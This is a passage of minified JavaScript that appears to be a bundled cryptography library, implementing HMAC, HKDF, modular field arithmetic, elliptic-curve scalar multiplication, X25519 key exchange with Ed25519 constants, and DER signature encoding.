        const Es = fo$1(q, U, Z, ms, oe);
        return st.set(Es, ws),
        Wt$1(Es),
        st
    },
    decrypt(et, st) {
        st = eo$1(et.length - 16, st, !1);
        const ws = et.subarray(0, -16)
          , ms = et.subarray(-16)
          , Es = fo$1(q, U, Z, ws, oe);
        if (!Tf(ms, Es))
            throw new Error("invalid tag");
        return st.set(et.subarray(0, -16)),
        q(U, Z, st, st, 1),
        Wt$1(Es),
        st
    }
})
  , co$1 = Rf({
    blockSize: 64,
    nonceLength: 12,
    tagLength: 16
}, Wf(zf));
let ao$1 = class extends Ie$1 {
    constructor(U, Z) {
        super(),
        this.finished = !1,
        this.destroyed = !1,
        rn$1(U);
        const oe = ht$1(Z);
        if (this.iHash = U.create(),
        typeof this.iHash.update != "function")
            throw new Error("Expected instance of class which extends utils.Hash");
        this.blockLen = this.iHash.blockLen,
        this.outputLen = this.iHash.outputLen;
        const et = this.blockLen
          , st = new Uint8Array(et);
        st.set(oe.length > et ? U.create().update(oe).digest() : oe);
        for (let ws = 0; ws < st.length; ws++)
            st[ws] ^= 54;
        this.iHash.update(st),
        this.oHash = U.create();
        for (let ws = 0; ws < st.length; ws++)
            st[ws] ^= 106;
        this.oHash.update(st),
        ut$1(st)
    }
    update(U) {
        return Nt$1(this),
        this.iHash.update(U),
        this
    }
    digestInto(U) {
        Nt$1(this),
        at(U, this.outputLen),
        this.finished = !0,
        this.iHash.digestInto(U),
        this.oHash.update(U),
        this.oHash.digestInto(U),
        this.destroy()
    }
    digest() {
        const U = new Uint8Array(this.oHash.outputLen);
        return this.digestInto(U),
        U
    }
    _cloneInto(U) {
        U || (U = Object.create(Object.getPrototypeOf(this), {}));
        const {oHash: Z, iHash: oe, finished: et, destroyed: st, blockLen: ws, outputLen: ms} = this;
        return U = U,
        U.finished = et,
        U.destroyed = st,
        U.blockLen = ws,
        U.outputLen = ms,
        U.oHash = Z._cloneInto(U.oHash),
        U.iHash = oe._cloneInto(U.iHash),
        U
    }
    clone() {
        return this._cloneInto()
    }
    destroy() {
        this.destroyed = !0,
        this.oHash.destroy(),
        this.iHash.destroy()
    }
}
;
const _e$2 = (q, U, Z) => new ao$1(q,U).update(Z).digest();
_e$2.create = (q, U) => new ao$1(q,U);
function Yf(q, U, Z) {
    return rn$1(q),
    Z === void 0 && (Z = new Uint8Array(q.outputLen)),
    _e$2(q, ht$1(Z), ht$1(U))
}
const vn$1 = Uint8Array.from([0])
  , uo$1 = Uint8Array.of();
function Xf(q, U, Z, oe=32) {
    rn$1(q),
    mt$1(oe);
    const et = q.outputLen;
    if (oe > 255 * et)
        throw new Error("Length should be <= 255*HashLen");
    const st = Math.ceil(oe / et);
    Z === void 0 && (Z = uo$1);
    const ws = new Uint8Array(st * et)
      , ms = _e$2.create(q, U)
      , Es = ms._cloneInto()
      , vs = new Uint8Array(ms.outputLen);
    for (let _s = 0; _s < st; _s++)
        vn$1[0] = _s + 1,
        Es.update(_s === 0 ? uo$1 : vs).update(Z).update(vn$1).digestInto(vs),
        ws.set(vs, et * _s),
        ms._cloneInto(Es);
    return ms.destroy(),
    Es.destroy(),
    ut$1(vs, vn$1),
    ws.slice(0, oe)
}
const Jf = (q, U, Z, oe, et) => Xf(q, Yf(q, U, Z), oe, et)
  , Te$1 = Ae
  , En$1 = BigInt(0)
  , Bn$1 = BigInt(1);
function Re(q, U) {
    if (typeof U != "boolean")
        throw new Error(q + " boolean expected, got " + U)
}
function $e$1(q) {
    const U = q.toString(16);
    return U.length & 1 ? "0" + U : U
}
function lo$1(q) {
    if (typeof q != "string")
        throw new Error("hex string expected, got " + typeof q);
    return q === "" ? En$1 : BigInt("0x" + q)
}
function Ce$1(q) {
    return lo$1(ce$1(q))
}
function Le$2(q) {
    return at(q),
    lo$1(ce$1(Uint8Array.from(q).reverse()))
}
function In$1(q, U) {
    return fn$1(q.toString(16).padStart(U * 2, "0"))
}
function An$1(q, U) {
    return In$1(q, U).reverse()
}
function rt(q, U, Z) {
    let oe;
    if (typeof U == "string")
        try {
            oe = fn$1(U)
        } catch (st) {
            throw new Error(q + " must be hex string or Uint8Array, cause: " + st)
        }
    else if (nn$1(U))
        oe = Uint8Array.from(U);
    else
        throw new Error(q + " must be hex string or Uint8Array");
    const et = oe.length;
    if (typeof Z == "number" && et !== Z)
        throw new Error(q + " of length " + Z + " expected, got " + et);
    return oe
}
const Sn$1 = q => typeof q == "bigint" && En$1 <= q;
function Qf(q, U, Z) {
    return Sn$1(q) && Sn$1(U) && Sn$1(Z) && U <= q && q < Z
}
function Nn$1(q, U, Z, oe) {
    if (!Qf(U, Z, oe))
        throw new Error("expected valid " + q + ": " + Z + " <= n < " + oe + ", got " + U)
}
function tc(q) {
    let U;
    for (U = 0; q > En$1; q >>= Bn$1,
    U += 1)
        ;
    return U
}
const je$1 = q => (Bn$1 << BigInt(q)) - Bn$1;
function ec(q, U, Z) {
    if (typeof q != "number" || q < 2)
        throw new Error("hashLen must be a number");
    if (typeof U != "number" || U < 2)
        throw new Error("qByteLen must be a number");
    if (typeof Z != "function")
        throw new Error("hmacFn must be a function");
    const oe = Ss => new Uint8Array(Ss)
      , et = Ss => Uint8Array.of(Ss);
    let st = oe(q)
      , ws = oe(q)
      , ms = 0;
    const Es = () => {
        st.fill(1),
        ws.fill(0),
        ms = 0
    }
      , vs = (...Ss) => Z(ws, st, ...Ss)
      , _s = (Ss=oe(0)) => {
        ws = vs(et(0), Ss),
        st = vs(),
        Ss.length !== 0 && (ws = vs(et(1), Ss),
        st = vs())
    }
      , Is = () => {
        if (ms++ >= 1e3)
            throw new Error("drbg: tried 1000 values");
        let Ss = 0;
        const Ts = [];
        for (; Ss < U; ) {
            st = vs();
            const Rs = st.slice();
            Ts.push(Rs),
            Ss += st.length
        }
        return Ht$1(...Ts)
    }
    ;
    return (Ss, Ts) => {
        Es(),
        _s(Ss);
        let Rs;
        for (; !(Rs = Ts(Is())); )
            _s();
        return Es(),
        Rs
    }
}
function ke$2(q, U, Z={}) {
    if (!q || typeof q != "object")
        throw new Error("expected valid options object");
    function oe(et, st, ws) {
        const ms = q[et];
        if (ws && ms === void 0)
            return;
        const Es = typeof ms;
        if (Es !== st || ms === null)
            throw new Error(`param "${et}" is invalid: expected ${st}, got ${Es}`)
    }
    Object.entries(U).forEach( ([et,st]) => oe(et, st, !1)),
    Object.entries(Z).forEach( ([et,st]) => oe(et, st, !0))
}
function ho$1(q) {
    const U = new WeakMap;
    return (Z, ...oe) => {
        const et = U.get(Z);
        if (et !== void 0)
            return et;
        const st = q(Z, ...oe);
        return U.set(Z, st),
        st
    }
}
const ot = BigInt(0)
  , Q$1 = BigInt(1)
  , Dt = BigInt(2)
  , nc = BigInt(3)
  , po$1 = BigInt(4)
  , go$1 = BigInt(5)
  , bo$1 = BigInt(8);
function lt(q, U) {
    const Z = q % U;
    return Z >= ot ? Z : U + Z
}
function pt(q, U, Z) {
    let oe = q;
    for (; U-- > ot; )
        oe *= oe,
        oe %= Z;
    return oe
}
function yo$1(q, U) {
    if (q === ot)
        throw new Error("invert: expected non-zero number");
    if (U <= ot)
        throw new Error("invert: expected positive modulus, got " + U);
    let Z = lt(q, U)
      , oe = U
      , et = ot
      , st = Q$1;
    for (; Z !== ot; ) {
        const ws = oe / Z
          , ms = oe % Z
          , Es = et - st * ws;
        oe = Z,
        Z = ms,
        et = st,
        st = Es
    }
    if (oe !== Q$1)
        throw new Error("invert: does not exist");
    return lt(et, U)
}
function mo$1(q, U) {
    const Z = (q.ORDER + Q$1) / po$1
      , oe = q.pow(U, Z);
    if (!q.eql(q.sqr(oe), U))
        throw new Error("Cannot find square root");
    return oe
}
function rc(q, U) {
    const Z = (q.ORDER - go$1) / bo$1
      , oe = q.mul(U, Dt)
      , et = q.pow(oe, Z)
      , st = q.mul(U, et)
      , ws = q.mul(q.mul(st, Dt), et)
      , ms = q.mul(st, q.sub(ws, q.ONE));
    if (!q.eql(q.sqr(ms), U))
        throw new Error("Cannot find square root");
    return ms
}
function oc(q) {
    if (q < BigInt(3))
        throw new Error("sqrt is not defined for small field");
    let U = q - Q$1
      , Z = 0;
    for (; U % Dt === ot; )
        U /= Dt,
        Z++;
    let oe = Dt;
    const et = Yt$1(q);
    for (; xo$1(et, oe) === 1; )
        if (oe++ > 1e3)
            throw new Error("Cannot find square root: probably non-prime P");
    if (Z === 1)
        return mo$1;
    let st = et.pow(oe, U);
    const ws = (U + Q$1) / Dt;
    return function(ms, Es) {
        if (ms.is0(Es))
            return Es;
        if (xo$1(ms, Es) !== 1)
            throw new Error("Cannot find square root");
        let vs = Z
          , _s = ms.mul(ms.ONE, st)
          , Is = ms.pow(Es, U)
          , Ss = ms.pow(Es, ws);
        for (; !ms.eql(Is, ms.ONE); ) {
            if (ms.is0(Is))
                return ms.ZERO;
            let Ts = 1
              , Rs = ms.sqr(Is);
            for (; !ms.eql(Rs, ms.ONE); )
                if (Ts++,
                Rs = ms.sqr(Rs),
                Ts === vs)
                    throw new Error("Cannot find square root");
            const Ns = Q$1 << BigInt(vs - Ts - 1)
              , Hs = ms.pow(_s, Ns);
            vs = Ts,
            _s = ms.sqr(Hs),
            Is = ms.mul(Is, _s),
            Ss = ms.mul(Ss, Hs)
        }
        return Ss
    }
}
function sc(q) {
    return q % po$1 === nc ? mo$1 : q % bo$1 === go$1 ? rc : oc(q)
}
const ic = ["create", "isValid", "is0", "neg", "inv", "sqrt", "sqr", "eql", "add", "sub", "mul", "pow", "div", "addN", "subN", "mulN", "sqrN"];
function fc(q) {
    const U = {
        ORDER: "bigint",
        MASK: "bigint",
        BYTES: "number",
        BITS: "number"
    }
      , Z = ic.reduce( (oe, et) => (oe[et] = "function",
    oe), U);
    return ke$2(q, Z),
    q
}
function cc(q, U, Z) {
    if (Z < ot)
        throw new Error("invalid exponent, negatives unsupported");
    if (Z === ot)
        return q.ONE;
    if (Z === Q$1)
        return U;
    let oe = q.ONE
      , et = U;
    for (; Z > ot; )
        Z & Q$1 && (oe = q.mul(oe, et)),
        et = q.sqr(et),
        Z >>= Q$1;
    return oe
}
function wo$1(q, U, Z=!1) {
    const oe = new Array(U.length).fill(Z ? q.ZERO : void 0)
      , et = U.reduce( (ws, ms, Es) => q.is0(ms) ? ws : (oe[Es] = ws,
    q.mul(ws, ms)), q.ONE)
      , st = q.inv(et);
    return U.reduceRight( (ws, ms, Es) => q.is0(ms) ? ws : (oe[Es] = q.mul(ws, oe[Es]),
    q.mul(ws, ms)), st),
    oe
}
function xo$1(q, U) {
    const Z = (q.ORDER - Q$1) / Dt
      , oe = q.pow(U, Z)
      , et = q.eql(oe, q.ONE)
      , st = q.eql(oe, q.ZERO)
      , ws = q.eql(oe, q.neg(q.ONE));
    if (!et && !st && !ws)
        throw new Error("invalid Legendre symbol result");
    return et ? 1 : st ? 0 : -1
}
function ac(q, U) {
    U !== void 0 && mt$1(U);
    const Z = U !== void 0 ? U : q.toString(2).length
      , oe = Math.ceil(Z / 8);
    return {
        nBitLength: Z,
        nByteLength: oe
    }
}
function Yt$1(q, U, Z=!1, oe={}) {
    if (q <= ot)
        throw new Error("invalid field: expected ORDER > 0, got " + q);
    let et, st;
    if (typeof U == "object" && U != null) {
        if (oe.sqrt || Z)
            throw new Error("cannot specify opts in two arguments");
        const _s = U;
        _s.BITS && (et = _s.BITS),
        _s.sqrt && (st = _s.sqrt),
        typeof _s.isLE == "boolean" && (Z = _s.isLE)
    } else
        typeof U == "number" && (et = U),
        oe.sqrt && (st = oe.sqrt);
    const {nBitLength: ws, nByteLength: ms} = ac(q, et);
    if (ms > 2048)
        throw new Error("invalid field: expected ORDER of <= 2048 bytes");
    let Es;
    const vs = Object.freeze({
        ORDER: q,
        isLE: Z,
        BITS: ws,
        BYTES: ms,
        MASK: je$1(ws),
        ZERO: ot,
        ONE: Q$1,
        create: _s => lt(_s, q),
        isValid: _s => {
            if (typeof _s != "bigint")
                throw new Error("invalid field element: expected bigint, got " + typeof _s);
            return ot <= _s && _s < q
        }
        ,
        is0: _s => _s === ot,
        isValidNot0: _s => !vs.is0(_s) && vs.isValid(_s),
        isOdd: _s => (_s & Q$1) === Q$1,
        neg: _s => lt(-_s, q),
        eql: (_s, Is) => _s === Is,
        sqr: _s => lt(_s * _s, q),
        add: (_s, Is) => lt(_s + Is, q),
        sub: (_s, Is) => lt(_s - Is, q),
        mul: (_s, Is) => lt(_s * Is, q),
        pow: (_s, Is) => cc(vs, _s, Is),
        div: (_s, Is) => lt(_s * yo$1(Is, q), q),
        sqrN: _s => _s * _s,
        addN: (_s, Is) => _s + Is,
        subN: (_s, Is) => _s - Is,
        mulN: (_s, Is) => _s * Is,
        inv: _s => yo$1(_s, q),
        sqrt: st || (_s => (Es || (Es = sc(q)),
        Es(vs, _s))),
        toBytes: _s => Z ? An$1(_s, ms) : In$1(_s, ms),
        fromBytes: _s => {
            if (_s.length !== ms)
                throw new Error("Field.fromBytes: expected " + ms + " bytes, got " + _s.length);
            return Z ? Le$2(_s) : Ce$1(_s)
        }
        ,
        invertBatch: _s => wo$1(vs, _s),
        cmov: (_s, Is, Ss) => Ss ? Is : _s
    });
    return Object.freeze(vs)
}
function vo$1(q) {
    if (typeof q != "bigint")
        throw new Error("field order must be bigint");
    const U = q.toString(2).length;
    return Math.ceil(U / 8)
}
function Eo$1(q) {
    const U = vo$1(q);
    return U + Math.ceil(U / 2)
}
function uc(q, U, Z=!1) {
    const oe = q.length
      , et = vo$1(U)
      , st = Eo$1(U);
    if (oe < 16 || oe < st || oe > 1024)
        throw new Error("expected " + st + "-1024 bytes of input, got " + oe);
    const ws = Z ? Le$2(q) : Ce$1(q)
      , ms = lt(ws, U - Q$1) + Q$1;
    return Z ? An$1(ms, et) : In$1(ms, et)
}
const Xt$1 = BigInt(0)
  , Mt$1 = BigInt(1);
function le$1(q, U) {
    const Z = U.negate();
    return q ? Z : U
}
function lc(q, U, Z) {
    const oe = U === "pz" ? st => st.pz : st => st.ez
      , et = wo$1(q.Fp, Z.map(oe));
    return Z.map( (st, ws) => st.toAffine(et[ws])).map(q.fromAffine)
}
function Bo$1(q, U) {
    if (!Number.isSafeInteger(q) || q <= 0 || q > U)
        throw new Error("invalid window size, expected [1.." + U + "], got W=" + q)
}
function On$1(q, U) {
    Bo$1(q, U);
    const Z = Math.ceil(U / q) + 1
      , oe = 2 ** (q - 1)
      , et = 2 ** q
      , st = je$1(q)
      , ws = BigInt(q);
    return {
        windows: Z,
        windowSize: oe,
        mask: st,
        maxNumber: et,
        shiftBy: ws
    }
}
function Io$1(q, U, Z) {
    const {windowSize: oe, mask: et, maxNumber: st, shiftBy: ws} = Z;
    let ms = Number(q & et)
      , Es = q >> ws;
    ms > oe && (ms -= st,
    Es += Mt$1);
    const vs = U * oe
      , _s = vs + Math.abs(ms) - 1
      , Is = ms === 0
      , Ss = ms < 0
      , Ts = U % 2 !== 0;
    return {
        nextN: Es,
        offset: _s,
        isZero: Is,
        isNeg: Ss,
        isNegF: Ts,
        offsetF: vs
    }
}
function dc(q, U) {
    if (!Array.isArray(q))
        throw new Error("array expected");
    q.forEach( (Z, oe) => {
        if (!(Z instanceof U))
            throw new Error("invalid point at index " + oe)
    }
    )
}
function hc(q, U) {
    if (!Array.isArray(q))
        throw new Error("array of scalars expected");
    q.forEach( (Z, oe) => {
        if (!U.isValid(Z))
            throw new Error("invalid scalar at index " + oe)
    }
    )
}
const Un$1 = new WeakMap
  , Ao$1 = new WeakMap;
function _n$1(q) {
    return Ao$1.get(q) || 1
}
function So$1(q) {
    if (q !== Xt$1)
        throw new Error("invalid wNAF")
}
function pc(q, U) {
    return {
        constTimeNegate: le$1,
        hasPrecomputes(Z) {
            return _n$1(Z) !== 1
        },
        unsafeLadder(Z, oe, et=q.ZERO) {
            let st = Z;
            for (; oe > Xt$1; )
                oe & Mt$1 && (et = et.add(st)),
                st = st.double(),
                oe >>= Mt$1;
            return et
        },
        precomputeWindow(Z, oe) {
            const {windows: et, windowSize: st} = On$1(oe, U)
              , ws = [];
            let ms = Z
              , Es = ms;
            for (let vs = 0; vs < et; vs++) {
                Es = ms,
                ws.push(Es);
                for (let _s = 1; _s < st; _s++)
                    Es = Es.add(ms),
                    ws.push(Es);
                ms = Es.double()
            }
            return ws
        },
        wNAF(Z, oe, et) {
            let st = q.ZERO
              , ws = q.BASE;
            const ms = On$1(Z, U);
            for (let Es = 0; Es < ms.windows; Es++) {
                const {nextN: vs, offset: _s, isZero: Is, isNeg: Ss, isNegF: Ts, offsetF: Rs} = Io$1(et, Es, ms);
                et = vs,
                Is ? ws = ws.add(le$1(Ts, oe[Rs])) : st = st.add(le$1(Ss, oe[_s]))
            }
            return So$1(et),
            {
                p: st,
                f: ws
            }
        },
        wNAFUnsafe(Z, oe, et, st=q.ZERO) {
            const ws = On$1(Z, U);
            for (let ms = 0; ms < ws.windows && et !== Xt$1; ms++) {
                const {nextN: Es, offset: vs, isZero: _s, isNeg: Is} = Io$1(et, ms, ws);
                if (et = Es,
                !_s) {
                    const Ss = oe[vs];
                    st = st.add(Is ? Ss.negate() : Ss)
                }
            }
            return So$1(et),
            st
        },
        getPrecomputes(Z, oe, et) {
            let st = Un$1.get(oe);
            return st || (st = this.precomputeWindow(oe, Z),
            Z !== 1 && (typeof et == "function" && (st = et(st)),
            Un$1.set(oe, st))),
            st
        },
        wNAFCached(Z, oe, et) {
            const st = _n$1(Z);
            return this.wNAF(st, this.getPrecomputes(st, Z, et), oe)
        },
        wNAFCachedUnsafe(Z, oe, et, st) {
            const ws = _n$1(Z);
            return ws === 1 ? this.unsafeLadder(Z, oe, st) : this.wNAFUnsafe(ws, this.getPrecomputes(ws, Z, et), oe, st)
        },
        setWindowSize(Z, oe) {
            Bo$1(oe, U),
            Ao$1.set(Z, oe),
            Un$1.delete(Z)
        }
    }
}
function gc(q, U, Z, oe) {
    let et = U
      , st = q.ZERO
      , ws = q.ZERO;
    for (; Z > Xt$1 || oe > Xt$1; )
        Z & Mt$1 && (st = st.add(et)),
        oe & Mt$1 && (ws = ws.add(et)),
        et = et.double(),
        Z >>= Mt$1,
        oe >>= Mt$1;
    return {
        p1: st,
        p2: ws
    }
}
function bc(q, U, Z, oe) {
    dc(Z, q),
    hc(oe, U);
    const et = Z.length
      , st = oe.length;
    if (et !== st)
        throw new Error("arrays of points and scalars must have equal length");
    const ws = q.ZERO
      , ms = tc(BigInt(et));
    let Es = 1;
    ms > 12 ? Es = ms - 3 : ms > 4 ? Es = ms - 2 : ms > 0 && (Es = 2);
    const vs = je$1(Es)
      , _s = new Array(Number(vs) + 1).fill(ws)
      , Is = Math.floor((U.BITS - 1) / Es) * Es;
    let Ss = ws;
    for (let Ts = Is; Ts >= 0; Ts -= Es) {
        _s.fill(ws);
        for (let Ns = 0; Ns < st; Ns++) {
            const Hs = oe[Ns]
              , ha = Number(Hs >> BigInt(Ts) & vs);
            _s[ha] = _s[ha].add(Z[Ns])
        }
        let Rs = ws;
        for (let Ns = _s.length - 1, Hs = ws; Ns > 0; Ns--)
            Hs = Hs.add(_s[Ns]),
            Rs = Rs.add(Hs);
        if (Ss = Ss.add(Rs),
        Ts !== 0)
            for (let Ns = 0; Ns < Es; Ns++)
                Ss = Ss.double()
    }
    return Ss
}
function No$1(q, U) {
    if (U) {
        if (U.ORDER !== q)
            throw new Error("Field.ORDER must match order: Fp == p, Fn == n");
        return fc(U),
        U
    } else
        return Yt$1(q)
}
function yc(q, U, Z={}) {
    if (!U || typeof U != "object")
        throw new Error(`expected valid ${q} CURVE object`);
    for (const ws of ["p", "n", "h"]) {
        const ms = U[ws];
        if (!(typeof ms == "bigint" && ms > Xt$1))
            throw new Error(`CURVE.${ws} must be positive bigint`)
    }
    const oe = No$1(U.p, Z.Fp)
      , et = No$1(U.n, Z.Fn)
      , st = ["Gx", "Gy", "a", q === "weierstrass" ? "b" : "d"];
    for (const ws of st)
        if (!oe.isValid(U[ws]))
            throw new Error(`CURVE.${ws} must be valid field element of CURVE.Fp`);
    return {
        Fp: oe,
        Fn: et
    }
}
BigInt(0),
BigInt(1),
BigInt(2),
BigInt(8);
const de$1 = BigInt(0)
  , Jt$1 = BigInt(1)
  , Pe = BigInt(2);
function mc(q) {
    return ke$2(q, {
        adjustScalarBytes: "function",
        powPminus2: "function"
    }),
    Object.freeze({
        ...q
    })
}
function wc(q) {
    const U = mc(q)
      , {P: Z, type: oe, adjustScalarBytes: et, powPminus2: st, randomBytes: ws} = U
      , ms = oe === "x25519";
    if (!ms && oe !== "x448")
        throw new Error("invalid type");
    const Es = ws || Zt$1
      , vs = ms ? 255 : 448
      , _s = ms ? 32 : 56
      , Is = BigInt(ms ? 9 : 5)
      , Ss = BigInt(ms ? 121665 : 39081)
      , Ts = ms ? Pe ** BigInt(254) : Pe ** BigInt(447)
      , Rs = ms ? BigInt(8) * Pe ** BigInt(251) - Jt$1 : BigInt(4) * Pe ** BigInt(445) - Jt$1
      , Ns = Ts + Rs + Jt$1
      , Hs = Bs => lt(Bs, Z)
      , ha = pa(Is);
    function pa(Bs) {
        return An$1(Hs(Bs), _s)
    }
    function Zs(Bs) {
        const Fa = rt("u coordinate", Bs, _s);
        return ms && (Fa[31] &= 127),
        Hs(Le$2(Fa))
    }
    function Qa(Bs) {
        return Le$2(et(rt("scalar", Bs, _s)))
    }
    function Ga(Bs, Fa) {
        const Js = el(Zs(Fa), Qa(Bs));
        if (Js === de$1)
            throw new Error("invalid private or public key received");
        return pa(Js)
    }
    function nl(Bs) {
        return Ga(Bs, ha)
    }
    function sl(Bs, Fa, Js) {
        const Wa = Hs(Bs * (Fa - Js));
        return Fa = Hs(Fa - Wa),
        Js = Hs(Js + Wa),
        {
            x_2: Fa,
            x_3: Js
        }
    }
    function el(Bs, Fa) {
        Nn$1("u", Bs, de$1, Z),
        Nn$1("scalar", Fa, Ts, Ns);
        const Js = Fa
          , Wa = Bs;
        let Za = Jt$1
          , tl = de$1
          , za = Bs
          , Ws = Jt$1
          , Ja = de$1;
        for (let Ya = BigInt(vs - 1); Ya >= de$1; Ya--) {
            const rl = Js >> Ya & Jt$1;
            Ja ^= rl,
            {x_2: Za, x_3: za} = sl(Ja, Za, za),
            {x_2: tl, x_3: Ws} = sl(Ja, tl, Ws),
            Ja = rl;
            const il = Za + tl
              , ol = Hs(il * il)
              , al = Za - tl
              , cl = Hs(al * al)
              , ll = ol - cl
              , ul = za + Ws
              , dl = za - Ws
              , fl = Hs(dl * il)
              , hl = Hs(ul * al)
              , pl = fl + hl
              , gl = fl - hl;
            za = Hs(pl * pl),
            Ws = Hs(Wa * Hs(gl * gl)),
            Za = Hs(ol * cl),
            tl = Hs(ll * (ol + Hs(Ss * ll)))
        }
        ({x_2: Za, x_3: za} = sl(Ja, Za, za)),
        {x_2: tl, x_3: Ws} = sl(Ja, tl, Ws);
        const Xa = st(tl);
        return Hs(Za * Xa)
    }
    return {
        scalarMult: Ga,
        scalarMultBase: nl,
        getSharedSecret: (Bs, Fa) => Ga(Bs, Fa),
        getPublicKey: Bs => nl(Bs),
        utils: {
            randomPrivateKey: () => Es(_s)
        },
        GuBytes: ha.slice()
    }
}
BigInt(0);
const xc = BigInt(1)
  , Oo$1 = BigInt(2)
  , vc = BigInt(3)
  , Ec = BigInt(5)
  , Bc = BigInt(8)
  , Uo$1 = {
    p: BigInt("0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffed"),
    n: BigInt("0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed"),
    h: Bc,
    a: BigInt("0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffec"),
    d: BigInt("0x52036cee2b6ffe738cc740797779e89800700a4d4141d8ab75eb4dca135978a3"),
    Gx: BigInt("0x216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51a"),
    Gy: BigInt("0x6666666666666666666666666666666666666666666666666666666666666658")
};
function Ic(q) {
    const U = BigInt(10)
      , Z = BigInt(20)
      , oe = BigInt(40)
      , et = BigInt(80)
      , st = Uo$1.p
      , ws = q * q % st * q % st
      , ms = pt(ws, Oo$1, st) * ws % st
      , Es = pt(ms, xc, st) * q % st
      , vs = pt(Es, Ec, st) * Es % st
      , _s = pt(vs, U, st) * vs % st
      , Is = pt(_s, Z, st) * _s % st
      , Ss = pt(Is, oe, st) * Is % st
      , Ts = pt(Ss, et, st) * Ss % st
      , Rs = pt(Ts, et, st) * Ss % st
      , Ns = pt(Rs, U, st) * vs % st;
    return {
        pow_p_5_8: pt(Ns, Oo$1, st) * q % st,
        b2: ws
    }
}
function Ac(q) {
    return q[0] &= 248,
    q[31] &= 127,
    q[31] |= 64,
    q
}
const Tn$1 = ( () => {
    const q = Uo$1.p;
    return wc({
        P: q,
        type: "x25519",
        powPminus2: U => {
            const {pow_p_5_8: Z, b2: oe} = Ic(U);
            return lt(pt(Z, vc, q) * oe, q)
        }
        ,
        adjustScalarBytes: Ac
    })
}
)();
function _o$1(q) {
    q.lowS !== void 0 && Re("lowS", q.lowS),
    q.prehash !== void 0 && Re("prehash", q.prehash)
}
class Sc extends Error {
    constructor(U="") {
        super(U)
    }
}
const vt$1 = {
    Err: Sc,
    _tlv: {
        encode: (q, U) => {
            const {Err: Z} = vt$1;
            if (q < 0 || q > 256)
                throw new Z("tlv.encode: wrong tag");
            if (U.length & 1)
                throw new Z("tlv.encode: unpadded data");
            const oe = U.length / 2
              , et = $e$1(oe);
            if (et.length / 2 & 128)
                throw new Z("tlv.encode: long form length too big");
            const st = oe > 127 ? $e$1(et.length / 2 | 128) : "";
            return $e$1(q) + st + et + U
        }
        ,
        decode(q, U) {
            const {Err: Z} = vt$1;
            let oe = 0;
            if (q < 0 || q > 256)
                throw new Z("tlv.encode: wrong tag");
            if (U.length < 2 || U[oe++] !== q)
                throw new Z("tlv.decode: wrong tlv");
            const et = U[oe++]
              , st = !!(et & 128);
            let ws = 0;
            if (!st)
                ws = et;
            else {
                const Es = et & 127;
                if (!Es)
                    throw new Z("tlv.decode(long): indefinite length not supported");
                if (Es > 4)
                    throw new Z("tlv.decode(long): byte length is too big");
                const vs = U.subarray(oe, oe + Es);
                if (vs.length !== Es)
                    throw new Z("tlv.decode: length bytes not complete");
                if (vs[0] === 0)
                    throw new Z("tlv.decode(long): zero leftmost byte");
                for (const _s of vs)
                    ws = ws << 8 | _s;
                if (oe += Es,
                ws < 128)
                    throw new Z("tlv.decode(long): not minimal encoding")
            }
            const ms = U.subarray(oe, oe + ws);
            if (ms.length !== ws)
                throw new Z("tlv.decode: wrong value length");
            return {
                v: ms,
                l: U.subarray(oe + ws)
            }
        }
    },
    _int: {
        encode(q) {
            const {Err: U} = vt$1;
            if (q < he$1)
                throw new U("integer: negative integers are not allowed");
            let Z = $e$1(q);
            if (Number.parseInt(Z[0], 16) & 8 && (Z = "00" + Z),
            Z.length & 1)
                throw new U("unexpected DER parsing assertion: unpadded hex");
            return Z
        },
        decode(q) {
            const {Err: U} = vt$1;
            if (q[0] & 128)
                throw new U("invalid signature integer: negative");
            if (q[0] === 0 && !(q[1] & 128))
                throw new U("invalid signature integer: unnecessary leading zero");
            return Ce$1(q)
        }
    },
    toSig(q) {
        const {Err: U, _int: Z, _tlv: oe} = vt$1
          , et = rt("signature", q)
          , {v: st, l: ws} = oe.decode(48, et);
        if (ws.length)
            throw new U("invalid signature: left bytes after parsing");
        const {v: ms, l: Es} = oe.decode(2, st)
          , {v: vs, l: _s} = oe.decode(2, Es);
        if (_s.length)
            throw new U("invalid signature: left bytes after parsing");
        return {
            r: Z.decode(ms),
            s: Z.decode(vs)
        }
    },
    hexFromSig(q) {
        const {_tlv: U, _int: Z} = vt$1
          , oe = U.encode(2, Z.encode(q.r))
          , et = U.encode(2, Z.encode(q.s))
          , st = oe + et;
        return U.encode(48, st)
    }
}
  , he$1 = BigInt(0)
  , pe$1 = BigInt(1)
  , Nc = BigInt(2)
  , He$1 = BigInt(3)
  , Oc = BigInt(4);
function Uc(q, U, Z) {
    function oe(et) {
        const st = q.sqr(et)
          , ws = q.mul(st, et);
        return q.add(q.add(ws, q.mul(et, U)), Z)
    }
    return oe
}
function To$1(q, U, Z) {
    const {BYTES: oe} = q;
    function et(st) {
        let ws;
        if (typeof st == "bigint")
            ws = st;
        else {
            let ms = rt("private key", st);
            if (U) {
                if (!U.includes(ms.length * 2))
                    throw new Error("invalid private key");
                const Es = new Uint8Array(oe);
                Es.set(ms, Es.length - ms.length),
                ms = Es
            }
            try {
                ws = q.fromBytes(ms)
            } catch {
                throw new Error(`invalid private key: expected ui8a of size ${oe}, got ${typeof st}`)
            }
        }
        if (Z && (ws = q.create(ws)),
        !q.isValidNot0(ws))
            throw new Error("invalid private key: out of range [1..N-1]");
        return ws
    }
    return et
}
function _c(q, U={}) {
    const {Fp: Z, Fn: oe} = yc("weierstrass", q, U)
      , {h: et, n: st} = q;
    ke$2(U, {}, {
        allowInfinityPoint: "boolean",
        clearCofactor: "function",
        isTorsionFree: "function",
        fromBytes: "function",
        toBytes: "function",
        endo: "object",
        wrapPrivateKey: "boolean"
    });
    const {endo: ws} = U;
    if (ws && (!Z.is0(q.a) || typeof ws.beta != "bigint" || typeof ws.splitScalar != "function"))
        throw new Error('invalid endo: expected "beta": bigint and "splitScalar": function');
    function ms() {
        if (!Z.isOdd)
            throw new Error("compression is not supported: Field does not have .isOdd()")
    }
    function Es(el, Bs, Fa) {
        const {x: Js, y: Wa} = Bs.toAffine()
          , Za = Z.toBytes(Js);
        if (Re("isCompressed", Fa),
        Fa) {
            ms();
            const tl = !Z.isOdd(Wa);
            return Ht$1(Ro$1(tl), Za)
        } else
            return Ht$1(Uint8Array.of(4), Za, Z.toBytes(Wa))
    }
    function vs(el) {
        at(el);
        const Bs = Z.BYTES
